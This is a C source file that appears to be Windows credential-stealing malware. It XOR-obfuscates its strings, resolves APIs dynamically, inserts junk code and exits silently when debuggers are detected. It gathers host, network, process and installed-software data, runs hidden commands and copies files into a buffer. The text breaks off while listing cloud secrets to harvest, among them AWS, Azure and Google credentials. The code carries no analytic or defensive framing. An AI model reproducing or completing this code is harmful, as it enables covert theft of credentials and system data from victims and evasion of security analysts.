#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <shlobj.h>
#include <iphlpapi.h>
#include <tlhelp32.h>





static const unsigned char _xk[16] = {0x27, 0xde, 0x57, 0xff, 0x13, 0xf6, 0x78, 0x96, 0x37, 0x14, 0x02, 0x8c, 0xd5, 0x88, 0xb0, 0x6d};
static unsigned char _es0[13] = {0x4c, 0xbb, 0x25, 0x91, 0x76, 0x9a, 0x4b, 0xa4, 0x19, 0x70, 0x6e, 0xe0, 0};
static unsigned char _es1[13] = {0x46, 0xba, 0x21, 0x9e, 0x63, 0x9f, 0x4b, 0xa4, 0x19, 0x70, 0x6e, 0xe0, 0};
static unsigned char _es2[25] = {0x64, 0xac, 0x32, 0x9e, 0x67, 0x93, 0x2c, 0xf9, 0x58, 0x78, 0x6a, 0xe9, 0xb9, 0xf8, 0x83, 0x5f, 0x74, 0xb0, 0x36, 0x8f, 0x60, 0x9e, 0x17, 0xe2, 0};
static unsigned char _es3[15] = {0x77, 0xac, 0x38, 0x9c, 0x76, 0x85, 0x0b, 0xa5, 0x05, 0x52, 0x6b, 0xfe, 0xa6, 0xfc, 0};
static unsigned char _es4[14] = {0x77, 0xac, 0x38, 0x9c, 0x76, 0x85, 0x0b, 0xa5, 0x05, 0x5a, 0x67, 0xf4, 0xa1, 0};
static unsigned char _es5[14] = {0x75, 0xbb, 0x30, 0xb0, 0x63, 0x93, 0x16, 0xdd, 0x52, 0x6d, 0x47, 0xf4, 0x94, 0};
static unsigned char _es6[18] = {0x6e, 0xad, 0x13, 0x9a, 0x71, 0x83, 0x1f, 0xf1, 0x52, 0x66, 0x52, 0xfe, 0xb0, 0xfb, 0xd5, 0x03, 0x53, 0};
static unsigned char _es7[27] = {0x64, 0xb6, 0x32, 0x9c, 0x78, 0xa4, 0x1d, 0xfb, 0x58, 0x60, 0x67, 0xc8, 0xb0, 0xea, 0xc5, 0x0a, 0x40, 0xbb, 0x25, 0xaf, 0x61, 0x93, 0x0b, 0xf3, 0x59, 0x60, 0};
static unsigned char _es8[22] = {0x1a, 0xe3, 0x6a, 0xdf, 0x40, 0xaf, 0x2b, 0xc2, 0x72, 0x59, 0x22, 0xc5, 0x9b, 0xce, 0xff, 0x4d, 0x1a, 0xe3, 0x6a, 0xf2, 0x19, 0};
static unsigned char _es9[6] = {0x66, 0x8c, 0x1a, 0xc9, 0x27, 0};
static unsigned char _es10[61] = {0x44, 0xb3, 0x33, 0xdf, 0x3c, 0x95, 0x58, 0xe5, 0x4e, 0x67, 0x76, 0xe9, 0xb8, 0xe1, 0xde, 0x0b, 0x48, 0xfe, 0x2b, 0xdf, 0x75, 0x9f, 0x16, 0xf2, 0x44, 0x60, 0x70, 0xac, 0xfa, 0xca, 0x90, 0x42, 0x64, 0xe4, 0x75, 0xbb, 0x7c, 0x9b, 0x19, 0xff, 0x59, 0x36, 0x22, 0xa3, 0x96, 0xb2, 0x92, 0x21, 0x48, 0xb9, 0x38, 0x91, 0x33, 0xa5, 0x1d, 0xe4, 0x41, 0x71, 0x70, 0xae, 0};
static unsigned char _es11[28] = {0x1a, 0xe3, 0x6a, 0xdf, 0x41, 0xa3, 0x36, 0xd8, 0x7e, 0x5a, 0x45, 0xac, 0x85, 0xda, 0xff, 0x2e, 0x62, 0x8d, 0x04, 0xba, 0x40, 0xd6, 0x45, 0xab, 0x0a, 0x19, 0x08, 0};
static unsigned char _es12[12] = {0x63, 0xb7, 0x24, 0x8f, 0x7f, 0x97, 0x01, 0xd8, 0x56, 0x79, 0x67, 0};
static unsigned char _es13[15] = {0x63, 0xb7, 0x24, 0x8f, 0x7f, 0x97, 0x01, 0xc0, 0x52, 0x66, 0x71, 0xe5, 0xba, 0xe6, 0};
static unsigned char _es14[29] = {0x1a, 0xe3, 0x6a, 0xdf, 0x5a, 0xb8, 0x2b, 0xc2, 0x76, 0x58, 0x4e, 0xc9, 0x91, 0xa8, 0xe3, 0x22, 0x61, 0x8a, 0x00, 0xbe, 0x41, 0xb3, 0x58, 0xab, 0x0a, 0x29, 0x0f, 0x86, 0};
static unsigned char _es15[52] = {0x74, 0x91, 0x11, 0xab, 0x44, 0xb7, 0x2a, 0xd3, 0x6b, 0x59, 0x6b, 0xef, 0xa7, 0xe7, 0xc3, 0x02, 0x41, 0xaa, 0x0b, 0xa8, 0x7a, 0x98, 0x1c, 0xf9, 0x40, 0x67, 0x5e, 0xcf, 0xa0, 0xfa, 0xc2, 0x08, 0x49, 0xaa, 0x01, 0x9a, 0x61, 0x85, 0x11, 0xf9, 0x59, 0x48, 0x57, 0xe2, 0xbc, 0xe6, 0xc3, 0x19, 0x46, 0xb2, 0x3b, 0};
static unsigned char _es16[52] = {0x74, 0x91, 0x11, 0xab, 0x44, 0xb7, 0x2a, 0xd3, 0x6b, 0x59, 0x6b, 0xef, 0xa7, 0xe7, 0xc3, 0x02, 0x41, 0xaa, 0x0b, 0xa8, 0x7a, 0x98, 0x1c, 0xf9, 0x40, 0x67, 0x5e, 0xcf, 0xa0, 0xfa, 0xc2, 0x08, 0x49, 0xaa, 0x01, 0x9a, 0x61, 0x85, 0x11, 0xf9, 0x59, 0x48, 0x57, 0xe2, 0xbc, 0xe6, 0xc3, 0x19, 0x46, 0xb2, 0x3b, 0};
static unsigned char _es17[27] = {0x1a, 0xe3, 0x6a, 0xdf, 0x56, 0xb8, 0x2e, 0xdf, 0x65, 0x5b, 0x4c, 0xc1, 0x90, 0xc6, 0xe4, 0x4d, 0x71, 0x9f, 0x05, 0xac, 0x33, 0xcb, 0x45, 0xab, 0x3a, 0x1e, 0};
static unsigned char _es18[20] = {0x1a, 0xe3, 0x6a, 0xdf, 0x50, 0xba, 0x31, 0xc6, 0x75, 0x5b, 0x43, 0xde, 0x91, 0xa8, 0x8d, 0x50, 0x1a, 0xd3, 0x5d, 0};
static unsigned char _es19[9] = {0x02, 0xf0, 0x7d, 0x8c, 0x1e, 0xfc, 0x75, 0x9c, 0};
static unsigned char _es20[25] = {0x1a, 0xe3, 0x6a, 0xdf, 0x44, 0xbf, 0x3e, 0xdf, 0x17, 0x44, 0x43, 0xdf, 0x86, 0xdf, 0xff, 0x3f, 0x63, 0x8d, 0x77, 0xc2, 0x2e, 0xcb, 0x75, 0x9c, 0};
static unsigned char _es21[32] = {0x44, 0xb3, 0x33, 0xdf, 0x3c, 0x95, 0x58, 0xf8, 0x52, 0x60, 0x71, 0xe4, 0xf5, 0xff, 0xdc, 0x0c, 0x49, 0xfe, 0x24, 0x97, 0x7c, 0x81, 0x58, 0xe6, 0x45, 0x7b, 0x64, 0xe5, 0xb9, 0xed, 0xc3, 0};
static unsigned char _es22[22] = {0x0f, 0xb0, 0x38, 0xdf, 0x64, 0x9a, 0x19, 0xf8, 0x17, 0x67, 0x67, 0xfe, 0xa3, 0xe1, 0xd3, 0x08, 0x0e, 0xd3, 0x5d, 0xf2, 0x19, 0};
static unsigned char _es23[17] = {0x66, 0xb2, 0x3b, 0xdf, 0x46, 0x85, 0x1d, 0xe4, 0x17, 0x44, 0x70, 0xe3, 0xb3, 0xe1, 0xdc, 0x08, 0};
static unsigned char _es24[8] = {0x77, 0xac, 0x38, 0x99, 0x7a, 0x9a, 0x1d, 0};
static unsigned char _es25[12] = {0x6c, 0xbb, 0x2e, 0xdf, 0x50, 0x99, 0x16, 0xe2, 0x52, 0x7a, 0x76, 0};
static unsigned char _es26[12] = {0x4c, 0xbb, 0x2e, 0xdf, 0x70, 0x99, 0x16, 0xe2, 0x52, 0x7a, 0x76, 0};
static unsigned char _es27[10] = {0x6b, 0xb1, 0x30, 0x96, 0x7d, 0xb2, 0x19, 0xe2, 0x56, 0};
static unsigned char _es28[8] = {0x64, 0xb1, 0x38, 0x94, 0x7a, 0x93, 0x0b, 0};
static unsigned char _es29[8] = {0x70, 0xbb, 0x35, 0xbb, 0x72, 0x82, 0x19, 0};
static unsigned char _es30[8] = {0x6f, 0xb7, 0x24, 0x8b, 0x7c, 0x84, 0x01, 0};
static unsigned char _es31[10] = {0x65, 0xb1, 0x38, 0x94, 0x7e, 0x97, 0x0a, 0xfd, 0x44, 0};
static unsigned char _es32[23] = {0x1a, 0xe3, 0x6a, 0xdf, 0x51, 0xa4, 0x37, 0xc1, 0x64, 0x51, 0x50, 0xac, 0x91, 0xc9, 0xe4, 0x2c, 0x07, 0xe3, 0x6a, 0xc2, 0x1e, 0xfc, 0};
static unsigned char _es33[14] = {0x42, 0xb0, 0x34, 0x8d, 0x6a, 0x86, 0x0c, 0xf3, 0x53, 0x4b, 0x69, 0xe9, 0xac, 0};
static unsigned char _es34[8] = {0x63, 0xbb, 0x31, 0x9e, 0x66, 0x9a, 0x0c, 0};
static unsigned char _es35[13] = {0x43, 0x8f, 0x20, 0xcb, 0x64, 0xcf, 0x2f, 0xf1, 0x6f, 0x77, 0x53, 0xb6, 0};
static unsigned char _es36[16] = {0x07, 0xfe, 0x23, 0x90, 0x78, 0x93, 0x16, 0xac, 0x17, 0x31, 0x2c, 0xa6, 0xa6, 0x85, 0xba, 0};
static unsigned char _es37[5] = {0x4a, 0xb8, 0x36, 0xd1, 0};
static unsigned char _es38[20] = {0x07, 0xfe, 0x3a, 0x99, 0x72, 0xa9, 0x0c, 0xf9, 0x5c, 0x71, 0x6c, 0xb6, 0xf5, 0xad, 0x9e, 0x47, 0x54, 0xd3, 0x5d, 0};
static unsigned char _es39[25] = {0x1a, 0xe3, 0x6a, 0xdf, 0x57, 0xbf, 0x2b, 0xd5, 0x78, 0x46, 0x46, 0xac, 0x81, 0xc7, 0xfb, 0x28, 0x69, 0x8d, 0x77, 0xc2, 0x2e, 0xcb, 0x75, 0x9c, 0};
static unsigned char _es40[19] = {0x1a, 0xe3, 0x6a, 0xdf, 0x47, 0xb3, 0x34, 0xd3, 0x70, 0x46, 0x43, 0xc1, 0xf5, 0xb5, 0x8d, 0x50, 0x2a, 0xd4, 0};
static unsigned char _es41[23] = {0x07, 0xfe, 0x3c, 0x9a, 0x6a, 0xa9, 0x1c, 0xf7, 0x43, 0x75, 0x71, 0xb6, 0xf5, 0xf8, 0xc2, 0x08, 0x54, 0xbb, 0x39, 0x8b, 0x1e, 0xfc, 0};
static unsigned char _es42[26] = {0x1a, 0xe3, 0x6a, 0xdf, 0x55, 0xa2, 0x28, 0xb6, 0x74, 0x46, 0x47, 0xc8, 0x90, 0xc6, 0xe4, 0x24, 0x66, 0x92, 0x04, 0xdf, 0x2e, 0xcb, 0x45, 0x9b, 0x3d, 0};
static unsigned char _es43[32] = {0x7c, 0x98, 0x3e, 0x93, 0x76, 0xac, 0x11, 0xfa, 0x5b, 0x75, 0x22, 0xfe, 0xb0, 0xeb, 0xd5, 0x03, 0x53, 0xad, 0x32, 0x8d, 0x65, 0x93, 0x0a, 0xe5, 0x19, 0x6c, 0x6f, 0xe0, 0x88, 0x85, 0xba, 0};
static unsigned char _es44[30] = {0x7c, 0x98, 0x3e, 0x93, 0x76, 0xac, 0x11, 0xfa, 0x5b, 0x75, 0x22, 0xff, 0xbc, 0xfc, 0xd5, 0x00, 0x46, 0xb0, 0x36, 0x98, 0x76, 0x84, 0x56, 0xee, 0x5a, 0x78, 0x5f, 0x81, 0xdf, 0};
static unsigned char _es45[42] = {0x74, 0x91, 0x11, 0xab, 0x44, 0xb7, 0x2a, 0xd3, 0x6b, 0x59, 0x63, 0xfe, 0xa1, 0xe1, 0xde, 0x4d, 0x77, 0xac, 0x3e, 0x94, 0x61, 0x8f, 0x14, 0xca, 0x60, 0x7d, 0x6c, 0xdf, 0x96, 0xd8, 0x90, 0x5f, 0x7b, 0x8d, 0x32, 0x8c, 0x60, 0x9f, 0x17, 0xf8, 0x44, 0};
static unsigned char _es46[26] = {0x1a, 0xe3, 0x6a, 0xdf, 0x55, 0xa2, 0x28, 0xb6, 0x74, 0x46, 0x47, 0xc8, 0x90, 0xc6, 0xe4, 0x24, 0x66, 0x92, 0x04, 0xdf, 0x2e, 0xcb, 0x45, 0x9b, 0x3d, 0};
static unsigned char _es47[20] = {0x7c, 0x89, 0x3e, 0x91, 0x40, 0xb5, 0x28, 0xb6, 0x44, 0x71, 0x71, 0xff, 0xbc, 0xe7, 0xde, 0x1e, 0x7a, 0xd3, 0x5d, 0};
static unsigned char _es48[9] = {0x6f, 0xb1, 0x24, 0x8b, 0x5d, 0x97, 0x15, 0xf3, 0};
static unsigned char _es49[9] = {0x72, 0xad, 0x32, 0x8d, 0x5d, 0x97, 0x15, 0xf3, 0};
static unsigned char _es50[9] = {0x77, 0xbf, 0x24, 0x8c, 0x64, 0x99, 0x0a, 0xf2, 0};
static unsigned char _es51[12] = {0x0f, 0xb5, 0x32, 0x86, 0x3e, 0x94, 0x19, 0xe5, 0x52, 0x70, 0x2b, 0};
static unsigned char _es52[19] = {0x1a, 0xe3, 0x6a, 0xdf, 0x40, 0xa5, 0x30, 0xb6, 0x7c, 0x51, 0x5b, 0xdf, 0xf5, 0xb5, 0x8d, 0x50, 0x2a, 0xd4, 0};
static unsigned char _es53[26] = {0x1a, 0xe3, 0x6a, 0xdf, 0x54, 0xbf, 0x2c, 0xb6, 0x74, 0x46, 0x47, 0xc8, 0x90, 0xc6, 0xe4, 0x24, 0x66, 0x92, 0x04, 0xdf, 0x2e, 0xcb, 0x45, 0x9b, 0x3d, 0};
static unsigned char _es54[5] = {0x2a, 0xd4, 0x5a, 0xf5, 0};
static unsigned char _es55[28] = {0x1a, 0xe3, 0x6a, 0xdf, 0x50, 0xba, 0x37, 0xc3, 0x73, 0x34, 0x41, 0xde, 0x90, 0xcc, 0xf5, 0x23, 0x73, 0x97, 0x16, 0xb3, 0x40, 0xd6, 0x45, 0xab, 0x0a, 0x19, 0x08, 0};
static unsigned char _es56[25] = {0x1a, 0xe3, 0x6a, 0xdf, 0x50, 0xa4, 0x21, 0xc6, 0x63, 0x5b, 0x22, 0xdb, 0x94, 0xc4, 0xfc, 0x28, 0x73, 0x8d, 0x77, 0xc2, 0x2e, 0xcb, 0x75, 0x9c, 0};
static unsigned char _es57[21] = {0x1a, 0xe3, 0x6a, 0xdf, 0x40, 0xb5, 0x2a, 0xd3, 0x72, 0x5a, 0x51, 0xc4, 0x9a, 0xdc, 0x90, 0x50, 0x1a, 0xe3, 0x5a, 0xf5, 0};
static unsigned char _es58[21] = {0x1a, 0xe3, 0x6a, 0xdf, 0x40, 0xb5, 0x2a, 0xd3, 0x72, 0x5a, 0x51, 0xc4, 0x9a, 0xdc, 0x90, 0x50, 0x1a, 0xe3, 0x5a, 0xf5, 0};
static unsigned char _es59[34] = {0x07, 0xfe, 0x7f, 0x8c, 0x78, 0x9f, 0x08, 0xe6, 0x52, 0x70, 0x38, 0xac, 0xbb, 0xe7, 0x90, 0x09, 0x42, 0xad, 0x3c, 0x8b, 0x7c, 0x86, 0x58, 0xe5, 0x52, 0x67, 0x71, 0xe5, 0xba, 0xe6, 0x99, 0x60, 0x2d, 0};
static void _xd_init(void){static int _d=0;if(_d)return;_d=1;for(int i=0;i<12;i++)_es0[i]^=_xk[i%16];for(int i=0;i<12;i++)_es1[i]^=_xk[i%16];for(int i=0;i<24;i++)_es2[i]^=_xk[i%16];for(int i=0;i<14;i++)_es3[i]^=_xk[i%16];for(int i=0;i<13;i++)_es4[i]^=_xk[i%16];for(int i=0;i<13;i++)_es5[i]^=_xk[i%16];for(int i=0;i<17;i++)_es6[i]^=_xk[i%16];for(int i=0;i<26;i++)_es7[i]^=_xk[i%16];for(int i=0;i<21;i++)_es8[i]^=_xk[i%16];for(int i=0;i<5;i++)_es9[i]^=_xk[i%16];for(int i=0;i<60;i++)_es10[i]^=_xk[i%16];for(int i=0;i<27;i++)_es11[i]^=_xk[i%16];for(int i=0;i<11;i++)_es12[i]^=_xk[i%16];for(int i=0;i<14;i++)_es13[i]^=_xk[i%16];for(int i=0;i<28;i++)_es14[i]^=_xk[i%16];for(int i=0;i<51;i++)_es15[i]^=_xk[i%16];for(int i=0;i<51;i++)_es16[i]^=_xk[i%16];for(int i=0;i<26;i++)_es17[i]^=_xk[i%16];for(int i=0;i<19;i++)_es18[i]^=_xk[i%16];for(int i=0;i<8;i++)_es19[i]^=_xk[i%16];for(int i=0;i<24;i++)_es20[i]^=_xk[i%16];for(int i=0;i<31;i++)_es21[i]^=_xk[i%16];for(int i=0;i<21;i++)_es22[i]^=_xk[i%16];for(int i=0;i<16;i++)_es23[i]^=_xk[i%16];for(int i=0;i<7;i++)_es24[i]^=_xk[i%16];for(int i=0;i<11;i++)_es25[i]^=_xk[i%16];for(int i=0;i<11;i++)_es26[i]^=_xk[i%16];for(int i=0;i<9;i++)_es27[i]^=_xk[i%16];for(int i=0;i<7;i++)_es28[i]^=_xk[i%16];for(int i=0;i<7;i++)_es29[i]^=_xk[i%16];for(int i=0;i<7;i++)_es30[i]^=_xk[i%16];for(int i=0;i<9;i++)_es31[i]^=_xk[i%16];for(int i=0;i<22;i++)_es32[i]^=_xk[i%16];for(int i=0;i<13;i++)_es33[i]^=_xk[i%16];for(int i=0;i<7;i++)_es34[i]^=_xk[i%16];for(int i=0;i<12;i++)_es35[i]^=_xk[i%16];for(int i=0;i<15;i++)_es36[i]^=_xk[i%16];for(int i=0;i<4;i++)_es37[i]^=_xk[i%16];for(int i=0;i<19;i++)_es38[i]^=_xk[i%16];for(int i=0;i<24;i++)_es39[i]^=_xk[i%16];for(int i=0;i<18;i++)_es40[i]^=_xk[i%16];for(int i=0;i<22;i++)_es41[i]^=_xk[i%16];for(int i=0;i<25;i++)_es42[i]^=_xk[i%16];for(int i=0;i<31;i++)_es43[i]^=_xk[i%16];for(int i=0;i<29;i++)_es44[i]^=_xk[i%16];for(int i=0;i<41;i++)_es45[i]^=_xk[i%16];for(int i=0;i<25;i++)_es46[i]^=_xk[i%16];for(int i=0;i<19;i++)_es47[i]^=_xk[i%16];for(int i=0;i<8;i++)_es48[i]^=_xk[i%16];for(int i=0;i<8;i++)_es49[i]^=_xk[i%16];for(int i=0;i<8;i++)_es50[i]^=_xk[i%16];for(int i=0;i<11;i++)_es51[i]^=_xk[i%16];for(int i=0;i<18;i++)_es52[i]^=_xk[i%16];for(int i=0;i<25;i++)_es53[i]^=_xk[i%16];for(int i=0;i<4;i++)_es54[i]^=_xk[i%16];for(int i=0;i<27;i++)_es55[i]^=_xk[i%16];for(int i=0;i<24;i++)_es56[i]^=_xk[i%16];for(int i=0;i<20;i++)_es57[i]^=_xk[i%16];for(int i=0;i<20;i++)_es58[i]^=_xk[i%16];for(int i=0;i<33;i++)_es59[i]^=_xk[i%16];}

/* dynamic API resolution */
typedef HANDLE (WINAPI *_tCreateToolhelp32Snapshot)(DWORD,DWORD);
static _tCreateToolhelp32Snapshot _pCreateToolhelp32Snapshot = NULL;
typedef BOOL (WINAPI *_tProcess32First)(HANDLE,LPPROCESSENTRY32);
static _tProcess32First _pProcess32First = NULL;
typedef BOOL (WINAPI *_tProcess32Next)(HANDLE,LPPROCESSENTRY32);
static _tProcess32Next _pProcess32Next = NULL;
typedef LSTATUS (WINAPI *_tRegOpenKeyExA)(HKEY,LPCSTR,DWORD,REGSAM,PHKEY);
static _tRegOpenKeyExA _pRegOpenKeyExA = NULL;
typedef BOOL (WINAPI *_tIsDebuggerPresent)(void);
static _tIsDebuggerPresent _pIsDebuggerPresent = NULL;
typedef BOOL (WINAPI *_tCheckRemoteDebuggerPresent)(HANDLE,PBOOL);
static _tCheckRemoteDebuggerPresent _pCheckRemoteDebuggerPresent = NULL;
static void _api_init(void){static int _d=0;if(_d)return;_d=1;HMODULE _hkernel32_dll=LoadLibraryA(((char*)_es0));HMODULE _hadvapi32_dll=LoadLibraryA(((char*)_es1));if(_hkernel32_dll)_pCreateToolhelp32Snapshot=(_tCreateToolhelp32Snapshot)GetProcAddress(_hkernel32_dll,((char*)_es2));if(_hkernel32_dll)_pProcess32First=(_tProcess32First)GetProcAddress(_hkernel32_dll,((char*)_es3));if(_hkernel32_dll)_pProcess32Next=(_tProcess32Next)GetProcAddress(_hkernel32_dll,((char*)_es4));if(_hadvapi32_dll)_pRegOpenKeyExA=(_tRegOpenKeyExA)GetProcAddress(_hadvapi32_dll,((char*)_es5));if(_hkernel32_dll)_pIsDebuggerPresent=(_tIsDebuggerPresent)GetProcAddress(_hkernel32_dll,((char*)_es6));if(_hkernel32_dll)_pCheckRemoteDebuggerPresent=(_tCheckRemoteDebuggerPresent)GetProcAddress(_hkernel32_dll,((char*)_es7));}

/* anti-debugging — exit silently if analyst tools are detected */
static int _chk_dbg(void) {
    if (_pIsDebuggerPresent()) return 1;
    BOOL _rd = FALSE;
    _pCheckRemoteDebuggerPresent(GetCurrentProcess(), &_rd);
    if (_rd) return 1;
    /* timing check: rdtsc delta > 10M cycles = single-stepping */
    LARGE_INTEGER _f, _s, _e;
    if (QueryPerformanceFrequency(&_f) && QueryPerformanceCounter(&_s)) {
        volatile int _v = 0;
        for (int i = 0; i < 100; i++) _v += i;
        QueryPerformanceCounter(&_e);
        if ((_e.QuadPart - _s.QuadPart) > _f.QuadPart) return 1;
    }
    return 0;
}

/* ── core/emit_buffer ── */

#define COLLECT_BUF (1024 * 1024)

static char *g_data = NULL;
static DWORD g_pos = 0;
static DWORD g_cap = 0;

static void init_buffer(void) {
    g_data = (char *)malloc(COLLECT_BUF);
    if (g_data) g_cap = COLLECT_BUF;
    g_pos = 0;
}

static void emit(const char *d, DWORD n) {
    { volatile DWORD _jd6099 = GetTickCount(); (void)_jd6099; }
    if (!g_data) return;
    if (g_pos + n >= g_cap) {
        DWORD _ntyjl = g_pos + n + (256 * (942 + 82));
        char *re = (char *)realloc(g_data, _ntyjl);
        { volatile int _jv7573 = 0; _jv7573 = _jv7573 ^ _jv7573; (void)_jv7573; }
        if (!re) return;
        g_data = re;
        g_cap = _ntyjl;
    }
    memcpy(g_data + g_pos, d, n);
    g_pos += n;
}

static void emitf(const char *fmt, ...) {
    char tmp[4096];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(tmp, sizeof(tmp), fmt, ap);
    va_end(ap);
    if (n > 0) emit(tmp, (DWORD)n);
}


/* ── core/run_cmd ── */
static void run_cmd(const char *cmd, char *out, DWORD out_sz, DWORD *out_len) {
    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
    HANDLE hRead, hWrite;
    *out_len = 0;
    { volatile DWORD _jd6449 = GetTickCount(); (void)_jd6449; }
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    char buf[512];
    strncpy(buf, cmd, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';
    if (!CreateProcessA(NULL, buf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hRead); CloseHandle(hWrite); return;
    }
    CloseHandle(hWrite);
    WaitForSingleObject(pi.hProcess, (14968 + 32));
    DWORD _tymhx = 0, _rnnbv = 0;
    while (_tymhx < out_sz - 1 && ReadFile(hRead, out + _tymhx, out_sz - _tymhx - 1, &_rnnbv, NULL) && _rnnbv > 0)
        _tymhx += _rnnbv;
    out[_tymhx] = '\0';
    *out_len = _tymhx;
    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}


/* ── core/file_ops ── */
static int file_exists(const char *path) {
    return GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES;
}

static void emit_file(const char *path, DWORD max_sz) {
    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                           NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    DWORD _ssxqy = GetFileSize(h, NULL);
    if (_ssxqy == 0 || _ssxqy > max_sz) { CloseHandle(h); return; }
    BYTE *buf = (BYTE *)malloc(_ssxqy);
    if (buf) {
        DWORD _rnnbv;
        { volatile int _jx1084 = 1; while(_jx1084 > 1) _jx1084--; (void)_jx1084; }
        if (ReadFile(h, buf, _ssxqy, &_rnnbv, NULL) && _rnnbv > 0)
            emit((const char *)buf, _rnnbv);
        free(buf);
    }
    CloseHandle(h);
}

static void grab_file(const char *src, const char *tag, DWORD max_sz) {
    char temp[MAX_PATH];
    GetTempPathA(MAX_PATH, temp);
    char dst[MAX_PATH];
    snprintf(dst, MAX_PATH, "%s\\~%lx.tmp", temp, GetTickCount());
    if (CopyFileA(src, dst, FALSE)) {
        HANDLE _hgaff = CreateFileA(dst, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        DWORD _fkzuv = (_hgaff != INVALID_HANDLE_VALUE) ? GetFileSize(_hgaff, NULL) : 0;
        if (_hgaff != INVALID_HANDLE_VALUE) CloseHandle(_hgaff);
        emitf("  [%s] %lu bytes\r\n", tag, (unsigned long)_fkzuv);
        emit_file(dst, max_sz);
        DeleteFileA(dst);
    }
}


/* ── collectors/system_info ── */

static void collect_system_info(void) {
    emitf(((char*)_es8));

    char hostname[256] = {0};
    DWORD _hipbc = sizeof(hostname);
    if (GetComputerNameA(hostname, &_hipbc)) emitf("Hostname: %s\r\n", hostname);

    char user[256] = {0};
    DWORD _ukpfs = sizeof(user);
    if (GetUserNameA(user, &_ukpfs)) emitf("Username: %s\r\n", user);

    OSVERSIONINFOA ov;
    ZeroMemory(&ov, sizeof(ov));
    ov.dwOSVersionInfoSize = sizeof(ov);
    GetVersionExA(&ov);
    emitf("OS: Windows %lu.%lu Build %lu\r\n", ov.dwMajorVersion, ov.dwMinorVersion, ov.dwBuildNumber);

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    emitf("Arch: %s  CPUs: %lu\r\n",
          si.wProcessorArchitecture == 9 ? "x64" :
          si.wProcessorArchitecture == 12 ? ((char*)_es9) : "x86",
          si.dwNumberOfProcessors);

    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    if (GlobalMemoryStatusEx(&ms))
        emitf("RAM: %llu MB\r\n", ms.ullTotalPhys / (1024 * (1023 + 1)));

    ULONG _aoxlp = 0;
    GetAdaptersInfo(NULL, &_aoxlp);
    if (_aoxlp > 0) {
        PIP_ADAPTER_INFO ai = (PIP_ADAPTER_INFO)malloc(_aoxlp);
        if (ai && GetAdaptersInfo(ai, &_aoxlp) == NO_ERROR) {
            { volatile DWORD _jp8689 = GetCurrentProcessId(); (void)_jp8689; }
            for (PIP_ADAPTER_INFO p = ai; p; p = p->Next)
                emitf("NIC: %s  IP: %s  MAC: %02X:%02X:%02X:%02X:%02X:%02X\r\n",
                      p->Description, p->IpAddressList.IpAddress.String,
                      p->Address[0], p->Address[1], p->Address[2],
                      p->Address[3], p->Address[4], p->Address[5]);
        }
        free(ai);
    }

    char cmd_out[4096] = {0};
    DWORD _ccien = 0;
    run_cmd(((char*)_es10),
            cmd_out, sizeof(cmd_out), &_ccien);
    if (_ccien > 0) emitf("%s", cmd_out);

    emitf("\r\n");
}


/* ── collectors/processes ── */

static void collect_processes(void) {
    emitf(((char*)_es11));
    HANDLE _srapr = _pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (_srapr == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    { volatile int _jx3564 = 1; while(_jx3564 > 1) _jx3564--; (void)_jx3564; }
    if (_pProcess32First(_srapr, &pe)) {
        do {
            emitf("  [%5lu] %s\r\n", pe.th32ProcessID, pe.szExeFile);
        } while (_pProcess32Next(_srapr, &pe));
    }
    CloseHandle(_srapr);
    emitf("\r\n");
}


/* ── collectors/installed_software ── */
static void enum_installed_from_key(HKEY root, const char *subkey) {
    HKEY _hfxww;
    { volatile DWORD _jd1351 = GetTickCount(); (void)_jd1351; }
    if (_pRegOpenKeyExA(root, subkey, 0, KEY_READ | KEY_WOW64_64KEY, &_hfxww) != ERROR_SUCCESS)
        return;
    char name[256];
    DWORD _ihqqn = 0, name_sz;
    while (1) {
        name_sz = sizeof(name);
        if (RegEnumKeyExA(_hfxww, _ihqqn++, name, &name_sz, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
            break;
        HKEY _sgzos;
        if (_pRegOpenKeyExA(_hfxww, name, 0, KEY_READ, &_sgzos) == ERROR_SUCCESS) {
            char display[256] = {0}, version[64] = {0};
            DWORD _djeod = sizeof(display), vsz = sizeof(version);
            RegQueryValueExA(_sgzos, ((char*)_es12), NULL, NULL, (BYTE *)display, &_djeod);
            RegQueryValueExA(_sgzos, ((char*)_es13), NULL, NULL, (BYTE *)version, &vsz);
            if (display[0])
                emitf("  %s %s\r\n", display, version);
            RegCloseKey(_sgzos);
        }
    }
    RegCloseKey(_hfxww);
}

static void collect_installed_software(void) {
    emitf(((char*)_es14));
    enum_installed_from_key(HKEY_LOCAL_MACHINE,
        ((char*)_es15));
    enum_installed_from_key(HKEY_CURRENT_USER,
        ((char*)_es16));
    emitf("\r\n");
}


/* ── collectors/env_vars ── */
static void collect_env_vars(void) {
    emitf(((char*)_es17));
    const char *interesting[] = {
        "USERDOMAIN", "LOGONSERVER", "COMPUTERNAME", "USERNAME",
        "HOMEPATH", "USERPROFILE", "PATH",
        "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
        "AZURE_SUBSCRIPTION_ID", "AZURE_TENANT_ID", "AZURE_CLIENT_SECRET",
        "GOOGLE_APPLICATION_CREDENTIALS",
